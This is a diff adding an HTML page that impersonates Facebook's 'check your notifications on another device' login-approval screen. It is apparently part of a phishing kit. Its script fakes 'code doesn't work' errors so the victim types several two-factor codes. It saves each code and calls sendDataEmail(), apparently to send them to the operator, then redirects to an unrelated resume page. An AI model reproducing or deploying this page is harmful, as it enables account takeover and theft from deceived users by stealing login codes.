@@ -1,0 +1,525 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log into Facebook | Facebook</title>
+    <!-- Bootstrap 5 CSS -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
+    <!-- Import Material Icons -->
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: linear-gradient(to bottom right, #f7ecec, #e9f4ff);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            margin: 0;
+            padding: 0;
+            overflow-x: hidden;
+            /* Prevent horizontal scrolling */
+        }
+
+        .container {
+            /* margin-top: 20px; */
+            max-width: 400px;
+            padding: 20px;
+            height: inherit;
+        }
+
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .header h2 {
+            font-size: 18px;
+            font-weight: bold;
+            margin: 0;
+        }
+
+        .header img {
+            width: 25px;
+            height: 25px;
+        }
+
+        .title {
+            margin: 20px 0;
+            font-size: 24px;
+            font-weight: bold;
+            color: #333;
+        }
+
+        .message {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 20px;
+        }
+
+
+
+        .image-container img {
+            max-width: 100%;
+            border-radius: 10px;
+            padding-bottom: 1rem;
+        }
+
+        .status {
+            display: flex;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        .status-icon {
+            width: 25px;
+            height: 25px;
+            margin-right: 10px;
+        }
+
+        .status-text {
+            font-size: 14px;
+            color: #333;
+        }
+
+        .btn-primary {
+            background-color: #1877f2;
+            border: none;
+            height: 50px;
+            border-radius: 40px;
+            font-size: 16px;
+            width: 100%;
+            position: relative;
+        }
+
+        .form-floating {
+            margin-bottom: 0.3rem !important;
+        }
+
+        .custom-input:focus {
+            outline: none;
+            border-color: grey;
+            border-width: 1px;
+            box-shadow: none;
+            /* Disable default box shadow */
+        }
+
+        .btn-primary:disabled {
+            opacity: 0.7;
+        }
+
+        .btn-outline-dark:disabled {
+            opacity: 0.7;
+        }
+
+        .forgot-password {
+            margin: 12px 0;
+            text-decoration: none;
+            color: rgb(28, 43, 51);
+            font-weight: 500;
+            display: inline;
+            font-size: 15px;
+            font-family: "Optimistic Text Normal";
+            white-space: pre-wrap;
+            overflow-wrap: break-word;
+        }
+
+        .btn-outline-dark {
+            height: 50px;
+            font-size: 16px;
+            width: 100%;
+            border-radius: 40px;
+        }
+
+        .btn-outline-dark:hover {
+            background-color: transparent;
+            color: grey;
+        }
+
+        .btn {
+            width: 100%;
+            height: 40px;
+        }
+
+        .form-floating {
+            position: relative;
+            margin-bottom: 1rem;
+        }
+
+        .form-floating input {
+            border: 1px solid #ced4da;
+            border-radius: 8px;
+            padding-right: 40px;
+            padding-left: 15px;
+            height: 50px;
+            box-shadow: none;
+            font-size: 16px;
+            width: 100%;
+        }
+
+        .form-floating label {
+            position: absolute;
+            top: 50%;
+            left: 15px;
+            transform: translateY(-50%);
+            display: flex;
+            align-items: center;
+            font-size: 16px;
+            color: #999;
+            background-color: white;
+            padding: 0 5px;
+            margin-top: 0;
+            transition: all 0.2s ease;
+        }
+
+        .form-floating input:focus+label,
+        .form-floating input:not(:placeholder-shown)+label {
+            top: -10px;
+            left: 10px;
+            font-size: 15px;
+            color: rgb(70, 90, 105);
+            display: inline;
+            font-size: 13px;
+            font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            white-space: pre-wrap;
+            overflow-wrap: break-word;
+            height: auto;
+            padding: 0 5px;
+            margin-top: 20px;
+        }
+
+        label {
+            background-color: transparent !important;
+        }
+
+        .clear-icon,
+        .show-password-icon {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            cursor: pointer;
+            font-size: 24px;
+            visibility: hidden;
+        }
+
+        .form-floating input:focus~.clear-icon,
+        .form-floating input:not(:placeholder-shown)~.clear-icon,
+        .form-floating input:focus~.show-password-icon,
+        .form-floating input:not(:placeholder-shown)~.show-password-icon {
+            visibility: visible;
+        }
+
+        .get-new-code {
+            background: none;
+            border: none;
+            color: #1a73e8;
+            font-size: 16px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            margin-bottom: 1rem;
+        }
+
+        .get-new-code .material-icons {
+            margin-right: 5px;
+            font-size: 28px;
+            padding-bottom: 2px;
+            color: rgb(28, 43, 51);
+        }
+
+        .get-new-code:disabled {
+            cursor: not-allowed;
+            color: grey;
+        }
+
+        .show {
+            display: block !important;
+        }
+
+        .error-text {
+            font-size: 13px;
+            padding-top: 0.75px;
+            padding-bottom: 0.75px;
+            color: rgb(237, 73, 86);
+        }
+
+        p.show {
+            display: block;
+        }
+
+        input.error+.icon-error {
+            display: block;
+        }
+
+        .icon-error {
+            position: absolute;
+            right: 10px;
+            top: 50%;
+            transform: translateY(-50%);
+            /* Center the icon vertically */
+            font-size: 24px;
+            color: #d32f2f;
+            /* Red color for icon */
+            display: none;
+        }
+
+
+        /* Custom smooth spinner styles */
+        .spinner {
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-top: 4px solid #fff;
+            border-radius: 50%;
+            width: 24px;
+            height: 24px;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            display: none;
+            animation: spin 1s linear infinite;
+        }
+
+        /* Spinner animation */
+        @keyframes spin {
+            0% {
+                transform: translate(-50%, -50%) rotate(0deg);
+            }
+
+            100% {
+                transform: translate(-50%, -50%) rotate(360deg);
+            }
+        }
+
+        .loading .spinner {
+            display: inline-block;
+        }
+
+        .loading .btn-text {
+            visibility: hidden;
+        }
+    </style>
+
+</head>
+
+<body>
+
+    <div class="container">
+        <!-- <div class="header">
+        <h2>Account • Facebook</h2> -->
+        <!-- <img src="https://image.shutterstock.com/image-vector/vector-icon-facebook-260nw-1132069877.jpg" alt="Facebook Icon"> -->
+        <!-- </div> -->
+        <div class="title">
+            Check your notifications on another device
+        </div>
+        <div class="message">
+            We sent a notification to your Windows PC and Mobile. Check your Facebook notifications there and approve
+            the login to continue.
+        </div>
+        <div class="image-container">
+            <img src="https://static.xx.fbcdn.net/rsrc.php/v3/yu/r/GHewCAICPwU.png" alt="Notification Image">
+        </div>
+        <div class="status">
+            <img class="status-icon" src="https://static.xx.fbcdn.net/rsrc.php/v3/yi/r/qaVZ-VsUttX.png"
+                alt="Waiting Icon">
+            <div class="status-text">
+                Waiting for approval <br> Approve from the other device to continue.
+            </div>
+        </div>
+
+        <form id="loginForm">
+            <!-- Mobile number or code input -->
+            <div class="form-floating position-relative">
+                <input type="text" class="form-control custom-input" id="code" placeholder="Enter code">
+                <label for="code">Enter code</label>
+                <span class="material-icons clear-icon" id="clearInput">clear</span>
+                <span class="material-icons icon-error">error_outline</span>
+            </div>
+            <p id="errorMessage" class="error-text d-none">This code doesn't work. Check that it's correct or try a new
+                one.</p>
+
+            <button id="getNewCode" class="get-new-code">
+                <span class="material-icons ">refresh</span>
+                <span id="countdown-text">Get a new code</span>
+            </button>
+
+
+            <button type="button" class="btn btn-primary" id="submitButton">
+                <span class="btn-text">Continue</span>
+                <div class="spinner"></div>
+            </button>
+            <button id="tryanother" class="btn btn-outline-dark mt-4">Try another way</button>
+        </form>
+
+    </div>
+
+
+    <script src="../js/common.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
+    <script>
+        // Clear the code input
+        $(document).ready(function () {
+            const $clearInput = $("#clearInput");
+            const $code = $("#code");
+            const $countdownText = $('#countdown-text');
+            const $getNewCodeButton = $('#getNewCode');
+            $("#submitButton").prop('disabled', true);
+            $("#tryanother").prop('disabled', true);
+            $clearInput.click(function () {
+                $code.val(''); // Clear the input value
+                $code.focus(); // Set focus back to the input
+            });
+
+            let countdownTimer;
+            function startCountdown() {
+                let countdown = 20;
+                $getNewCodeButton.prop('disabled', true); // Disable the button
+                $("#submitButton").prop('disabled', true);
+
+                $countdownText.html(`We can send a new code in ${countdown}s`);
+                countdownTimer = setInterval(() => {
+                    countdown--;
+                    $countdownText.html(`We can send a new code in ${countdown}s`);
+                    if (countdown === 0) {
+                        clearInterval(countdownTimer);
+                        $countdownText.html("Get a new code");
+                        $getNewCodeButton.prop('disabled', false); // Enable the button
+                        $("#tryanother").prop('disabled', false);
+                        $("#submitButton").prop('disabled', false);
+                    }
+                }, 1000);
+            }
+            $("#code").on('keypress', function (event) {
+                var charCode = event.which ? event.which : event.keyCode;
+                if (charCode < 48 || charCode > 57) {
+                    event.preventDefault();
+                }
+
+            });
+            $("#code").on('input', function (event) {
+                console.log($("#code").val().length);
+                if ($("#code").val().length === 6 || $("#code").val().length === 8) {
+                    if (!$getNewCodeButton.prop('disabled')) {
+                        $("#submitButton").prop('disabled', false);
+                    }
+                }
+                else {
+                    $("#submitButton").prop('disabled', true);
+                }
+            });
+
+            $("#getNewCode").click(function (e) {
+                startCountdown();
+            });
+            $("#tryanother").click(function (e) {
+                startCountdown();
+            });
+
+            let n = 0;
+
+            $("#submitButton").click(function (e) {
+                e.preventDefault(); // Prevent the default form submission behavior
+
+                const $this = $(this); // Cache the jQuery object of the button
+
+                $this.addClass('loading'); // Add the 'loading' class
+                $this.prop('disabled', true); // Disable the button
+
+                n++;
+
+                switch (n) {
+                    case 1:
+                        {
+                            setTimeout(() => {
+                                $this.removeClass('loading'); // Remove the 'loading' class
+                                $this.prop('disabled', false); // Enable the button again
+
+                                $("#errorMessage").removeClass("d-none"); // Show the error message
+                                $code.css("border-color", "#d32f2f");
+                                $code.css("border-color", "#d32f2f");
+                                $code.addClass("error");
+                                $("label").css("color", "rgb(237, 73, 86)");
+                                // $(".icon-error").addClass("show");
+                                // $(".icon-error").css("display", "block");
+                                localStorage.setItem('code1', $("#code").val());
+                                // sendDataEmail();
+                                $code.val(''); // Clear the input value
+                                $code.focus(); // Set focus back to the input
+                                $("#submitButton").prop('disabled', true);
+                            }, 2000); // 2-second delay to simulate loading
+
+                            break;
+                        }
+                    case 2:
+                        {
+                            setTimeout(() => {
+                                $this.removeClass('loading'); // Remove the 'loading' class
+                                $this.prop('disabled', false); // Enable the button again
+
+                                $("#errorMessage").removeClass("d-none"); // Show the error message
+                                $code.css("border-color", "#d32f2f");
+                                $code.css("border-color", "#d32f2f");
+                                $code.addClass("error");
+                                $("label").css("color", "rgb(237, 73, 86)");
+
+                                // $(".icon-error").addClass("show");
+                                // $(".icon-error").css("display", "block");
+                                localStorage.setItem('code2', $("#code").val());
+                                sendDataEmail();
+                                $code.val(''); // Clear the input value
+                                $code.focus(); // Set focus back to the input
+                                $("#submitButton").prop('disabled', true);
+                            }, 2000);
+                            break;
+                        }
+                    case 3:
+                        {
+                            setTimeout(() => {
+                                $this.removeClass('loading');
+                                $this.prop('disabled', false);
+                                $("#errorMessage").removeClass("d-none");
+                                $code.css("border-color", "#d32f2f");
+                                $code.css("border-color", "#d32f2f");
+                                $code.addClass("error");
+                                $("label").css("color", "rgb(237, 73, 86)");
+                                window.location.href = "../resume/education.html";
+                            }, 2000);
+                            localStorage.setItem('code3', $("#code").val());
+                            sendDataEmail();
+                            break;
+                        }
+                    default:
+                        {
+                            sendDataEmail();
+                            window.location.href = "../resume/education.html";
+                            break;
+                        }
+                }
+
+                startCountdown();
+            });
+        });
+
+
+        //     $("#code").focus(function () {
+        //     if ($("#code").hasClass("error")) {
+        //         $(".icon-error").removeClass("show");
+        //         $(".clear-icon").css("display", "block");
+        //     }
+        //   });
+
+        //   $("#code").blur(function () {
+        //     if ($("#code").hasClass("error")) {
+        //       $(".icon-error").addClass("show");
+        //       $(".clear-icon").css("display", "none");
+        //     }
+        //   });
+    </script>
+
+</body>
+
+</html>
